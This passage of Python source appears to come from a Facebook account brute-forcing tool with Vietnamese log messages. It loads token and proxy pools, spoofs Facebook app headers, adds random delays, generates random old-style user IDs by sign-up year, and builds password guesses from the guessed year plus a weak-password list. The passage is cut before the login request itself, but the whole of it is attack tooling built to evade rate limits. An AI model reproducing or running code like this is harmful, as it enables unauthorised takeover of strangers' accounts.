request_count  = 0
req_lock       = threading.Lock()

# ── loaders ──────────────────────────────────────────────────────────────────
def load_tokens():
    global token_pool
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f:
            lines = [l.strip() for l in f if l.strip()]
        if lines:
            token_pool = lines
            print(f"{GREEN}[+] Loaded {len(token_pool)} tokens tu file{RESET}")
            return
    token_pool = BUILTIN_TOKENS[:]
    print(f"{YELLOW}[!] Dung builtin tokens ({len(token_pool)}){RESET}")

def load_proxies():
    global proxy_pool
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            proxy_pool = [l.strip() for l in f if l.strip()]
        print(f"{GREEN}[+] Loaded {len(proxy_pool)} proxies{RESET}")
    else:
        print(f"{YELLOW}[!] Khong co proxy file — chay direct{RESET}")

# ── helpers ───────────────────────────────────────────────────────────────────
def get_token():
    return random.choice(token_pool) if token_pool else BUILTIN_TOKENS[0]

def get_proxy():
    if proxy_pool:
        p = random.choice(proxy_pool)
        return {'http': p, 'https': p}
    return None

def get_headers():
    return {
        'User-Agent':              random.choice(UA_LIST),
        'Accept':                  'application/json',
        'Accept-Language':         'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'X-FB-Connection-Type':    'WIFI',
        'X-FB-Net-HNI':            str(random.randint(40000, 50000)),
        'X-FB-SIM-HNI':            str(random.randint(40000, 50000)),
        'X-FB-Connection-Quality': 'EXCELLENT',
        'X-FB-HTTP-Engine':        'Liger',
        'Content-Type':            'application/x-www-form-urlencoded',
    }

def jitter(base=0.05, spread=0.08):
    time.sleep(base + random.uniform(0, spread))

def guess_year(uid):
    uid = str(uid)
    prefixes = {
        '100000': '2009-2010', '100001': '2010',
        '100002': '2011',      '100003': '2011',
        '100004': '2012',      '100005': '2013',
        '100006': '2013',      '100007': '2014',
        '100008': '2014',      '100009': '2015',
        '6155':   '2020+',
    }
    for p, y in prefixes.items():
        if uid.startswith(p):
            return y
    try:
        n = int(uid)
        if n < 1_000_000:       return '2004-2005'
        if n < 50_000_000:      return '2006-2007'
        return '2008-2009'
    except ValueError:
        return 'Unknown'

def generate_uid(series=None):
    r = random.choices
    if series == '2009-2010':
        sub = random.choice(['0', '1'])
        return '10000' + sub + ''.join(r('0123456789', k=9))
    if series == '2011-2012':
        sub = random.choice(['2', '3', '4'])
        return '10000' + sub + ''.join(r('0123456789', k=9))
    if series == '2013-2014':
        sub = random.choice(['5', '6', '7', '8'])
        return '10000' + sub + ''.join(r('0123456789', k=9))
    if series == '2015':
        return '100009' + ''.join(r('0123456789', k=8))
    if series == 'old':
        return str(random.randint(1_000, 999_999_999))
    # random all
    sub = random.choice('123456789')
    return '10000' + sub + ''.join(r('0123456789', k=9))

def build_password_list(uid):
    year = guess_year(uid)
    extras = []
    if year and year[0].isdigit():
        y = year[:4]
        extras += [y, y[2:], y + '123', '123' + y]
    return extras + WEAK_PASSWORDS

# ── API calls ─────────────────────────────────────────────────────────────────
def _post(url, data=None, params=None):
    global request_count
    with req_lock:
        request_count += 1
    try:
        if data:
            r = requests.post(url, data=data, headers=get_headers(),
                              proxies=get_proxy(), timeout=TIMEOUT, verify=False)
        else:
            r = requests.get(url, params=params, headers=get_headers(),
                             proxies=get_proxy(), timeout=TIMEOUT, verify=False)
        if r.status_code == 429:
            with scan_lock:
                global rate_limited
                rate_limited += 1
            time.sleep(random.uniform(2, 5))
            return {'error': 'rate_limited'}
        return r.json()
    except Exception as e:
        return {'error': str(e)}

